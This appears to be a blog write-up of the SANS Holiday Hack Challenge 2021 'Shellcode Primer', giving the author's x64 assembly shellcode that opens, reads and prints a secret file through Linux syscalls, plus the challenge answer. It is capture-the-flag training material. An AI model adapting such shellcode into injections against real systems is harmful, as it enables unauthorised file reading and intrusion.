---
layout: post
title:  "6 - Shellcode Primer"
date:   2021-12-15 02:00:39 -0800
categories: kringlecon2021 objective6 main
---

This is challenge number 6 in the 2021 SANS Holiday Hack Challenge (https://2021.kringlecon.com/). Objective:

>Complete the Shellcode Primer in Jack's office. According to the last challenge, what is the secret to KringleCon success? "All of our speakers and organizers, providing the gift of ____, free to the community." Talk to Chimney Scissorsticks in the NetWars area for hints.


This challenge/training is "a training program conceived by Jack Frost (yes, THE Jack Frost) to train trolls how to build exploit code, from the ground up. This will teach how to write working x64 shellcode to read a file and print it to standard output!" This primer walks through several "Hello world" type examples, and leaves the last challenge mostly up to us. I will focus on the last challenge from the shellcode primer



>For this exercise, we're going to read a specific file… let's say, /var/northpolesecrets.txt… and write it to stdout.
No reason for the name, but since this is Jack Frost's troll-trainer, it might be related to a top-secret mission!

>Solving this is going to require three syscalls! Four if you decide to use sys_exit - you're welcome to return or exit, just don't forget to fix the stack if
you return!

>First up, just like last exercise, call sys_open. This time, be sure to open /var/northpolesecrets.txt.

>Second, find the sys_read entry on the syscall table, and set up the call. Some tips:

>    The file descriptor is returned by sys_open
    The buffer for reading the file can be any writeable memory - rsp is a great option, temporary storage is what the stack is meant for
    You can experiment to find the right count, but if it's a bit too high, that's perfectly fine

>Third, find the sys_write entry, and use it to write to stdout. Some tips on that:

>    The file descriptor for stdout is always 1
    The best value for count is the return value from sys_read, but you can experiment with that as well (if it's too long, you might get some garbage after;
    that's okay!)

>Finally, if you use rsp as a buffer, you won't be able to ret - you're going to overwrite the return address and ret will crash. That's okay! You remember
how to sys_exit, right? :)

Here we define a null terminated string which will be the name of the file we need to read. We also call into our get_secret function and pop address into rcx so we can find our shellcode address and string location

{% highlight shell %}
call get_secret
db '/var/northpolesecrets.txt',0
get_secret:
pop rcx
{% endhighlight %}

Here we call sys_open as defined here https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/, and open the file path stored in rcx


>2	sys_open	const char *filename	int flags	int mode


{% highlight shell %}
; TODO: Call sys_open
mov rax, 2
mov rdi,rcx
mov rsi,0
mov rdx,0
syscall
{% endhighlight %}


Here we read the open file using sys_read as defined here https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/. I created a string to allocate a buffer on the stack where the contents of the file could be read. Without writing this buffer, I kept overwriting instructions that would cause the program to crash.


>0	sys_read	unsigned int fd	char *buf	size_t count


{% highlight shell %}
; TODO: Call sys_read on the file handle and read it into rsp
call stringbuf
db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',0
stringbuf:
pop rcx
push rdi
push rax
mov rax, 0
pop rdi
mov rsi, rcx
mov rdx,260
syscall
{% endhighlight %}



Next up was calling sys_write to print the file contents to the stdout for viewing. I make a call to sys_write as defined here https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

>1	sys_write	unsigned int fd	const char *buf	size_t count

{% highlight shell %}
; TODO: Call sys_write to write the contents from rsp to stdout (1)
push rsi
push rax
mov rax, 1
mov rdi,1
pop rdx
pop rsi
syscall
{% endhighlight %}


Finally call sys_exit as defined here https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

{% highlight shell %}
; TODO: Call sys_exit
mov rax, 60
mov rdi, 0
syscall
{% endhighlight %}


And we run it!

![Objective6 output](/assets/kringlecon2021/objective6/objective6_output.jpg)

We have our answer to the challenge

>Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.

![Objective6 complete](/assets/kringlecon2021/objective6/objective6_complete.jpg)
